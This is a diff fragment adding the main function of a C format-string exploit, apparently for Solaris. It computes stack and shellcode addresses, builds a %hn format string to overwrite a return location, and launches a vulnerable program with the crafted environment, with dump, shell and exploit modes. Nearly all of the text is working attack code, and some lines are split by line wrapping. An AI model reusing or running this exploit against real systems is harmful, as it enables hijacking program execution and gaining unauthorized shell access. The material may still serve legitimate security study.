+main(int argc, char **argv)
+{
+    char shellbuf[SHELL], pattern[PATTERN], platform[256];
+    char *ptr;
+    long sp_addr, sh_addr, jmp_addr, reth, retl;
+    int num = NUM, align = ALIGN, shellofs = SHELLOFS, retlocofs = RETLOCOFS, r
+etloc = RETLOC;
+    int i;
+
+    int dump = 0, shell = 0, exploit = 0;
+
+    /* read the exploit arguments */
+
+    if (argc < 2) {
+        usage(argv[0]);
+    }
+
+    if (!strncmp(argv[1], "dump", 4)) { dump = 1; }
+    else if(!strncmp(argv[1], "shell", 5)) { shell = 1; }
+    else if(!strncmp(argv[1], "exploit", 7)) { exploit = 1; }
+    else {
+        usage(argv[0]);
+    }
+
+    for (i = 2; i < argc; i++) {
+        if ( (sscanf(argv[i], "--align=%d", &align) ||
+              sscanf(argv[i], "--num=%d", &num) ||
+              sscanf(argv[i], "--shellofs=%d", &shellofs) ||
+              sscanf(argv[i], "--retlocofs=%d", &retlocofs) ||
+              sscanf(argv[i], "--retloc=%x", &retloc))== 0) {
+                printf("Unrecognized option %s\n\n", argv[i]);
+                usage(argv[0]);
+            }
+    }
+    
+    /* create the shell buffer */
+
+    create_shellbuf(shellbuf, align, retloc);
+
+    if (shell == 1) {
+        printf("shellbuf (length = %d): %s\n\n", strlen(shellbuf)+1, shellbuf);
+    }
+    
+    /* calculate memory addresses */
+
+    sysinfo(SI_PLATFORM, platform, 256);            /* get platform info  */
+
+    sp_addr = (get_sp() | 0xffff) & 0xfffffffc;     /* get stack bottom address
+ */
+    sh_addr = sp_addr - (strlen(VULPROG)+1) - (strlen(platform)+1) - (strlen(sh
+ellbuf)+1) + shellofs;
+    
+    /* sh_add now points to the beginning of the shell buffer */
+    
+    printf("Calculated shell buffer address: 0x%x\n", sh_addr);
+
+    if (shell == 1) {
+        put_long(&shellbuf[align], sh_addr);        /* put sh_addr on the stack
+ */
+    }
+
+    if ( ((sh_addr + align) & 0xfffffffc) != (sh_addr + align) ) {
+        printf("Warning: sh_addr + align must be word aligned. Adjust shellofs 
+and align as neccessary\n");
+    }
+    
+    if (retloc == RETLOC) {                         /* if retloc was not specif
+ied on the command line, calculate it */
+        retloc = sh_addr + align - num*4 + retlocofs;
+        printf("Calculated retloc: 0x%x\n", retloc);
+
+        put_long(&shellbuf[align+4], retloc);
+        put_long(&shellbuf[align+12], retloc+2);
+    }
+
+    jmp_addr = (sh_addr + align) + 64;              /* Calculate the shell jump
+ location */
+    printf("Calculated shell code jump location: 0x%x\n\n", jmp_addr);
+
+    /* create the format string */
+
+    ptr = pattern;
+    for (i = 0; i < num; i++) {
+        memcpy(ptr, "%.8x", 4);
+        ptr = ptr + 4;
+    }
+
+    if (dump == 1) {
+        *ptr = 0;                                   /* null-terminate */
+        printf("Stack dump mode, dumping %d words\n", num);
+    }
+    else if (shell == 1) {
+        sprintf(ptr, " Shell buffer: %%s");
+        printf("Shell buffer dump mode, shell buffer address is 0x%x\n", sh_add
+r);
+    }
+    else {
+        reth = (jmp_addr >> 16) & 0xffff;
+        retl = (jmp_addr >> 0) & 0xffff;
+
+        sprintf(ptr, "%%%uc%%hn%%%uc%%hn", (reth - num * 8), (retl - reth));
+        printf("Exploit mode, jumping to 0x%x\n", jmp_addr);
+    }
+    
+    printf("num: %d\t\talign: %d\tshellofs: %d\tretlocofs: %d\tretloc: 0x%x\n\n
+",
+            num, align, shellofs, retlocofs, retloc);
+
+    /* execute the vulnerable program using our custom environment */
+
+    execute_vulnprog(pattern, shellbuf);
+            
+}
+
+
